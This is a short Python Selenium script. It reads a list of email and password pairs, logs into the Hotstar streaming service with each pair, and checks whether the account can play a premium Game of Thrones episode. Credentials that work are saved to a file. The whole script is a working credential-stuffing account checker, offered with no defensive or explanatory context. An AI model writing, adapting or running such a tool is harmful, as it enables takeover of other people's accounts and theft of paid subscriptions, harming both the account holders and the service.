from  selenium import webdriver
from  selenium.webdriver.common.keys import Keys
import time
no=1
file=open(input(),'r')
got=open("gotable.txt",'a')
skipped=open("skip.txt",'a')

for line in file:
    print(no)
    no+=1
    if '@' in line:
        mail=line.split()[0]
        passw=line.split()[2]
        driver=webdriver.Chrome()

        try:
            driver.set_page_load_timeout(15)
            driver.get("https://www.hotstar.com/subscribe/sign-in")
        except:
            driver.close()
            skipped.write(line)
            break
        login = driver.find_element_by_css_selector(".email-fb-button")
        login.click()
        time.sleep(3)
        while 1:
            try:
                element = driver.find_element_by_name("emailId")
                break
            except:
                u=1
        element.send_keys(mail)
        while 1:
            try:
                submit = driver.find_element_by_css_selector(".submit-button")
                break
            except:
                u=1
        submit.click()
        time.sleep(3)
        try:
            element2 = driver.find_element_by_id("password")
        except:
            driver.close()
            continue
        element2.send_keys(passw)
        submit2 = driver.find_element_by_css_selector(".submit-button")
        submit2.click()
        time.sleep(3)
        if driver.current_url=="https://www.hotstar.com/":
            driver.get("https://www.hotstar.com/tv/game-of-thrones/s-510/the-long-night/1770005123")
            time.sleep(3)
            try:
                element3=driver.find_element_by_css_selector(".premium-free-trial")
                driver.close()
                continue
            except:
                time.sleep(3)
                try:
                    element3=driver.find_element_by_css_selector(".premium-free-trial")
                    driver.close()
                    continue
                except:
                    time.sleep(5)
                    try:
                        element3=driver.find_element_by_css_selector(".premium-free-trial")
                        driver.close()
                        continue
                    except:
                        print("This one working "+ mail+'\n\n')
                        got.write(mail+" : "+passw +'\n')
                        driver.close()
                        continue
        else:
            driver.close()
            continue
